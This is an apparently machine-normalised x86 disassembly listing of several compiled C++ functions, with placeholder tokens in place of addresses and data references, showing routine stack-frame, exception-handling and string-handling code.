sub_401000
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_459db0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
xor edi edi
cmp ecx edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
call eax
cmp eax edi
jne r-xdata
or eax 0xffffffff
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax + 0x4c ]
add eax 0x2c
cmp ecx eax
je r-xdata
mov eax 0xfffffffe
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax 0xfffffffd
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax ecx
mov [ esp + 0x10 ] ecx
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x18 ]
add ecx 0x8
add esi 0x8
je r-xdata
mov eax [ eax + 0x20 ]
mov edx [ eax + 0x18 ]
cmp [ edx ] edi
jne r-xdata
cmp ecx edi
je r-xdata
mov [ esp + 0x10 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp [ ecx ] edi
jne r-xdata
mov eax ecx
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] edi
mov [ esp + 0x34 ] 0x0
lea ebx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
xor eax eax
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebx
push eax
push ecx
lea ecx [ esp + 0x38 ]
call sub_42a180
mov ebx [ ebp + 0xc ]
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x5c ] edi
call sub_40ede0
mov edi 0x10
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x48 ] edi
jb r-xdata
xor ebx ebx
mov eax esi
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x34 ]
push edx
call sub_43f960
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x1c ]
call sub_42a180
mov ebx [ ebp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x5c ] 0x1
call sub_40ede0
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x2c ] edi
jb r-xdata
xor eax eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x18 ] al
mov eax [ esp + 0x10 ]
mov [ esp + 0x2c ] 0xf
xor edi edi
mov ecx [ esp + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
sub_4011d0
push 0xffffffff
push sub_458f98
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
call sub_40fb00
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_401230
push 0xffffffff
push sub_459762
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ esi + 0x20 ]
test edi edi
je r-xdata
push rw-data
push 0x48
call sub_43fc52
add esp 0x8
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
push 0x0
push edi
call edx
mov al 0x1
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x10
retn
xor eax eax
push eax
call sub_42b300
jmp r-xdata
mov [ esi + 0x20 ] 0x0
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
xor al al
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x10
retn
mov [ esp + 0x10 ] 0xffffffff
mov [ esi + 0x20 ] eax
test eax eax
je r-xdata
sub_4012e0
mov eax [ edi + 0x20 ]
sub esp 0x14
push ebx
push ebp
push esi
test eax eax
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x4
mov esi [ eax + 0x18 ]
mov [ esp + 0x10 ] esi
test esi esi
je r-xdata
mov ebx [ esi + 0x18 ]
test ebx ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x34 ]
mov ecx esi
call eax
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
mov eax edi
call sub_40fa80
mov esi ebx
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x1c ]
mov ecx esi
call eax
test eax eax
jne r-xdata
mov [ esp + 0x10 ] esi
test esi esi
jne r-xdata
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push esi
call eax
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
mov ebx [ esp + 0x24 ]
mov edx [ ebx ]
add eax 0x8
push esi
push eax
mov eax [ edx + 0x4 ]
mov ecx ebx
call eax
test eax eax
jne r-xdata
cmp [ edi + 0x1c ] esi
je r-xdata
jmp r-xdata
mov eax edi
call sub_40fa10
mov esi [ eax ]
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
push esi
mov ecx ebx
call eax
test eax eax
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x1c ] eax
jne r-xdata
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
mov [ edi + 0x18 ] 0x0
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x18 ]
lea ebx [ eax + ecx ]
cmp eax ebx
jbe r-xdata
mov esi [ edi ]
mov ebp esi
mov [ esp + 0x14 ] ebx
test esi esi
jne r-xdata
call sub_4407b7
mov eax [ esi ]
mov ecx eax
jmp r-xdata
call sub_4407b7
xor eax eax
xor ecx ecx
mov ecx [ ecx + 0x1c ]
add ecx [ eax + 0x18 ]
dec ebx
cmp ebx ecx
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push esi
call eax
test eax eax
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x1c ] eax
jne r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
xor esi esi
mov esi [ esi + 0x28 ]
test esi esi
je r-xdata
mov [ edi + 0x18 ] 0x0
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
call sub_412220
mov esi [ eax ]
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
cmp ebx [ esi + 0x18 ]
jae r-xdata
jmp r-xdata
sub_4014d0
push 0xffffffff
push sub_459d7b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x20 ] 0xf
xor eax eax
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] al
mov [ esi + 0x38 ] eax
mov ecx 0x7
mov [ esi + 0x3c ] ecx
xor edx edx
mov [ esi + 0x28 ] dx
mov [ esi + 0x58 ] ecx
mov [ esi + 0x54 ] eax
mov [ esi + 0x44 ] dx
mov [ esi + 0x74 ] ecx
mov [ esi + 0x70 ] eax
mov [ esi + 0x60 ] dx
mov [ esi + 0x94 ] ecx
mov [ esi + 0x90 ] eax
mov [ esi + 0x80 ] dx
mov [ esi + 0xc4 ] ecx
xor ecx ecx
mov [ esi + 0xc0 ] eax
mov [ esi + 0xb0 ] cx
lea edx [ esi + 0xc8 ]
push edx
mov [ esp + 0x14 ] eax
call sub_40f4f0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x8
sub_401590
push 0xffffffff
push sub_45a476
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1f8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1f4 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov ebp ecx
mov [ esp + 0x10c ] 0xf
mov [ esp + 0x108 ] ebx
mov [ esp + 0xf8 ] bl
mov [ esp + 0x214 ] ebx
mov ecx [ esp + 0x21c ]
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
cmp ecx ebx
je r-xdata
lea eax [ esp + 0x30 ]
push eax
call sub_40f720
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x218 ] 0x1
call sub_40f720
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x224 ]
push ecx
mov [ esp + 0x220 ] 0x2
call sub_401000
test eax eax
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
cmp eax ebx
je r-xdata
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
cmp [ esp + 0x16 ] bl
je r-xdata
mov esi [ eax + 0x20 ]
push ebx
push r--data
lea ecx [ esp + 0xfc ]
add esi 0x8
call sub_42a180
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
call sub_43f960
mov eax [ esp + 0x40 ]
add esp 0x4
cmp eax ebx
je r-xdata
mov edx [ esp + 0x48 ]
mov edi [ esp + 0x28 ]
push edx
call sub_412b30
mov eax [ esp + 0x28 ]
push eax
call sub_43f960
add esp 0x8
cmp [ esp + 0x17 ] bl
je r-xdata
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov ecx r--data
lea edi [ esp + 0xf4 ]
call sub_4122d0
test al al
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
call sub_43f960
add esp 0x4
cmp [ esp + 0x10c ] 0x10
jb r-xdata
mov edx [ esp + 0x48 ]
mov edi [ esp + 0x40 ]
push edx
call sub_412b30
mov eax [ esp + 0x40 ]
push eax
call sub_43f960
add esp 0x8
lea eax [ esp + 0x148 ]
call sub_402420
mov [ esp + 0x214 ] 0x9
push r--data
lea esi [ esp + 0x34 ]
mov [ esp + 0x1dc ] ebx
mov [ esp + 0x1e4 ] ebx
mov [ esp + 0x1e8 ] ebx
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
mov edi 0xf
push eax
lea ecx [ esp + 0xe4 ]
mov [ esp + 0xfc ] edi
mov [ esp + 0xf8 ] ebx
mov [ esp + 0xe8 ] bl
call sub_429ea0
xor eax eax
mov [ esp + 0x9c ] 0x7
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] ax
lea ecx [ esp + 0xd8 ]
push ecx
lea eax [ esp + 0x88 ]
mov [ esp + 0x218 ] 0x4
call sub_40f040
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
call sub_4407b7
mov ecx r--data
lea edi [ esp + 0xf4 ]
call sub_4122d0
test al al
je r-xdata
push ebx
lea esi [ ebp + 0x24 ]
mov eax r--data
mov [ esp + 0x1a ] 0x1
call sub_429cc0
push ebx
lea esi [ ebp + 0x40 ]
mov eax r--data
call sub_429cc0
push ebx
lea esi [ ebp + 0x5c ]
mov eax r--data
call sub_429cc0
push ebx
push r--data
lea ecx [ ebp + 0x8 ]
call sub_42a180
lea eax [ ebp + 0xc8 ]
call sub_40ef20
mov [ ebp + 0xa0 ] ebx
mov [ ebp + 0xa4 ] ebx
mov [ ebp + 0x98 ] ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0xfc ]
call sub_42a180
xor eax eax
mov ecx [ esp + 0x20c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x1f4 ]
xor ecx esp
call sub_43f96b
add esp 0x204
retn 0x4
mov edx [ esp + 0xf8 ]
push edx
call sub_43f960
add esp 0x4
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
mov edi 0xf
push eax
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xe0 ] edi
mov [ esp + 0xdc ] ebx
mov [ esp + 0xcc ] bl
call sub_429ea0
xor eax eax
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xa4 ] ax
lea ecx [ esp + 0xbc ]
push ecx
lea eax [ esp + 0xa4 ]
mov [ esp + 0x218 ] 0xb
call sub_40f040
push 0xffffffff
push ebx
lea eax [ esp + 0xa8 ]
lea ecx [ esp + 0x16c ]
call sub_429a10
push 0xffffffff
push ebx
lea eax [ esp + 0xa8 ]
lea ecx [ esp + 0x188 ]
call sub_429a10
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
call sub_4407b7
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x74 ]
mov [ esp + 0x8c ] edi
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
call sub_429ea0
mov [ esp + 0x214 ] 0x5
cmp [ esp + 0x80 ] 0x10
mov ecx [ esp + 0x6c ]
jae r-xdata
call sub_4407b7
mov [ esp + 0x17 ] 0x1
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x154 ]
call sub_429ea0
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
call sub_4407b7
push 0xfde9
lea eax [ esp + 0xa4 ]
push eax
call sub_40eca0
push r--data
lea esi [ esp + 0x34 ]
mov [ esp + 0x218 ] 0x6
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp esi ecx
jb r-xdata
lea ecx [ esp + 0x6c ]
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x90 ]
mov [ esp + 0xa8 ] edi
mov [ esp + 0xa4 ] ebx
mov [ esp + 0x94 ] bl
call sub_429ea0
push r--data
lea esi [ esp + 0x34 ]
mov [ esp + 0x218 ] 0xc
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
call sub_4407b7
mov eax [ esp + 0x24 ]
lea edx [ esi * 8 ]
push 0xffffffff
sub edx esi
lea eax [ eax + edx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_429ea0
mov [ esp + 0x214 ] 0x7
cmp [ esp + 0x64 ] 0x10
mov ecx [ esp + 0x50 ]
jae r-xdata
call sub_4407b7
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_429ea0
mov [ esp + 0x214 ] 0xd
mov ecx [ esp + 0x50 ]
mov esi 0x10
cmp [ esp + 0x64 ] esi
jae r-xdata
call sub_4407b7
push 0xfde9
lea edx [ esp + 0xc0 ]
push edx
call sub_40eca0
push 0xffffffff
push ebx
lea ecx [ ebp + 0x7c ]
lea eax [ esp + 0xc4 ]
mov [ esp + 0x21c ] 0x8
call sub_429a10
push 0xffffffff
push ebx
lea ecx [ ebp + 0x5c ]
lea eax [ esp + 0xa8 ]
call sub_429a10
push 0xffffffff
push ebx
lea ecx [ ebp + 0x24 ]
lea eax [ esp + 0x8c ]
call sub_429a10
push 0xffffffff
push ebx
lea ecx [ ebp + 0x40 ]
lea eax [ esp + 0x8c ]
call sub_429a10
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
lea ecx [ esp + 0x50 ]
push 0xfde9
lea eax [ esp + 0x130 ]
push eax
call sub_40eca0
mov [ esp + 0x214 ] 0xe
mov ecx [ esp + 0x88 ]
cmp [ esp + 0x9c ] esi
jae r-xdata
lea ecx [ esp + 0x50 ]
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_429ea0
push r--data
lea esi [ esp + 0x34 ]
mov [ ebp + 0x7a ] 0x1
mov [ ebp + 0x79 ] bl
mov [ ebp + 0x78 ] bl
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
call sub_4407b7
push 0xfde9
lea edx [ esp + 0x114 ]
push edx
call sub_40eca0
push 0xffffffff
push ebx
lea eax [ esp + 0x134 ]
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x21c ] 0xf
call sub_429a10
push 0xffffffff
push ebx
lea eax [ esp + 0x118 ]
lea ecx [ esp + 0x1c4 ]
call sub_429a10
push r--data
lea esi [ esp + 0x34 ]
mov [ esp + 0x1be ] bl
mov [ esp + 0x1bc ] bl
mov [ esp + 0x1bd ] bl
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
lea ecx [ esp + 0x88 ]
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
lea edi [ edx + ecx * 4 ]
mov ecx r--data
call sub_4122d0
test al al
je r-xdata
call sub_4407b7
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
lea edi [ edx + ecx * 4 ]
mov ecx r--data
call sub_4122d0
test al al
je r-xdata
call sub_4407b7
mov edi 0x8
mov [ ebp + 0xa8 ] 0xffffffff
cmp [ esp + 0xd4 ] edi
jb r-xdata
mov [ ebp + 0x79 ] 0x1
mov [ ebp + 0x78 ] 0x1
push r--data
lea esi [ esp + 0x34 ]
call sub_4022a0
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov esi eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov [ esp + 0x1b9 ] 0x1
mov [ esp + 0x1b8 ] 0x1
xor ecx ecx
cmp [ esp + 0x64 ] 0x10
mov esi 0x7
mov [ esp + 0xd4 ] esi
mov [ esp + 0xd0 ] ebx
mov [ esp + 0xc0 ] cx
jb r-xdata
mov eax [ esp + 0xc0 ]
push eax
call sub_43f960
add esp 0x4
mov edx [ esp + 0x24 ]
lea ecx [ esi * 8 ]
sub ecx esi
push 0xffffffff
lea eax [ edx + ecx * 4 ]
push ebx
push eax
lea ecx [ esp + 0x74 ]
mov [ esp + 0x8c ] 0xf
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
call sub_429ea0
mov [ esp + 0x214 ] 0x10
mov ecx [ esp + 0x6c ]
mov esi 0x10
cmp [ esp + 0x80 ] esi
jae r-xdata
call sub_4407b7
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
cmp [ esp + 0xb8 ] edi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_43f960
add esp 0x4
push ebx
lea eax [ esp + 0xdc ]
push eax
call sub_40eca0
push 0xffffffff
push ebx
lea eax [ esp + 0xe0 ]
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x21c ] 0x11
call sub_429a10
lea ecx [ esp + 0x148 ]
push ecx
lea edi [ ebp + 0xc8 ]
call sub_40ee80
mov edi 0x8
cmp [ esp + 0xf0 ] edi
jb r-xdata
lea ecx [ esp + 0x6c ]
xor ecx ecx
cmp [ esp + 0x80 ] 0x10
mov [ esp + 0xb8 ] esi
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xa4 ] cx
jb r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov ebp 0x7
mov [ esp + 0xf0 ] ebp
mov [ esp + 0xec ] ebx
mov [ esp + 0xdc ] ax
cmp [ esp + 0x80 ] esi
jb r-xdata
mov edx [ esp + 0xdc ]
push edx
call sub_43f960
add esp 0x4
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] bl
cmp [ esp + 0x9c ] edi
jb r-xdata
mov edx [ esp + 0x6c ]
push edx
call sub_43f960
add esp 0x4
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] bl
cmp [ esp + 0x128 ] edi
jb r-xdata
mov ecx [ esp + 0x6c ]
push ecx
call sub_43f960
add esp 0x4
xor ecx ecx
mov [ esp + 0x214 ] 0x2
cmp [ esp + 0xf0 ] 0x10
mov [ esp + 0x9c ] esi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] cx
jb r-xdata
mov eax [ esp + 0x88 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0x128 ] ebp
mov [ esp + 0x124 ] ebx
mov [ esp + 0x114 ] ax
cmp [ esp + 0x144 ] edi
jb r-xdata
mov edx [ esp + 0x114 ]
push edx
call sub_43f960
add esp 0x4
mov edx [ esp + 0xdc ]
push edx
call sub_43f960
add esp 0x4
xor edx edx
mov [ esp + 0x144 ] ebp
mov [ esp + 0x140 ] ebx
mov [ esp + 0x130 ] dx
cmp [ esp + 0x64 ] esi
jb r-xdata
mov ecx [ esp + 0x130 ]
push ecx
call sub_43f960
add esp 0x4
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
cmp [ esp + 0x9c ] esi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_43f960
add esp 0x4
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
cmp [ esp + 0xb8 ] edi
jb r-xdata
mov ecx [ esp + 0x88 ]
push ecx
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0xb8 ] ebp
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xa4 ] ax
cmp [ esp + 0xd4 ] esi
jb r-xdata
mov edx [ esp + 0xa4 ]
push edx
call sub_43f960
add esp 0x4
lea esi [ esp + 0x148 ]
mov [ esp + 0xd4 ] 0xf
mov [ esp + 0xd0 ] ebx
mov [ esp + 0xc0 ] bl
call sub_402480
mov ecx [ esp + 0xc0 ]
push ecx
call sub_43f960
add esp 0x4
sub_402140
push 0xffffffff
push sub_45ab86
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf4 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov ebp ecx
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
mov [ esp + 0x114 ] ebx
mov ecx [ esp + 0x11c ]
cmp ecx ebx
je r-xdata
xor eax eax
mov ecx [ esp + 0x10c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xf4 ]
xor ecx esp
call sub_43f96b
add esp 0x104
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
cmp eax ebx
je r-xdata
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov esi [ eax + 0x20 ]
push ebx
push r--data
lea ecx [ esp + 0x1c ]
add esi 0x8
call sub_42a180
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
mov ecx r--data
lea edi [ esp + 0x14 ]
call sub_4122d0
test al al
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x30 ]
push eax
call sub_402560
lea edi [ ebp + 0x8 ]
lea esi [ esp + 0x30 ]
mov [ esp + 0x114 ] 0x1
call sub_402610
lea ecx [ esp + 0xf0 ]
lea edx [ ebp + 0xc8 ]
push ecx
call sub_40ef70
mov edi [ ebp + 0x4 ]
mov edx esi
push edx
call sub_40f5d0
lea ebx [ esp + 0xf0 ]
call sub_40ffb0
mov eax [ esp + 0xf0 ]
push eax
call sub_43f960
add esp 0x4
call sub_402480
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x1c ]
call sub_42a180
sub_4022a0
push 0xffffffff
push sub_459d48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push ebp
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x34 ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
xor edi edi
shr eax 0x1f
add eax edx
mov [ esp + 0x10 ] edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
add esp 0x30
retn 0x4
mov [ esp + 0x14 ] edi
jmp r-xdata
mov [ esp + 0x2c ] edi
mov edi [ esp + 0x44 ]
mov eax edi
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x1c ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ esp + 0x20 ]
call sub_42a180
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
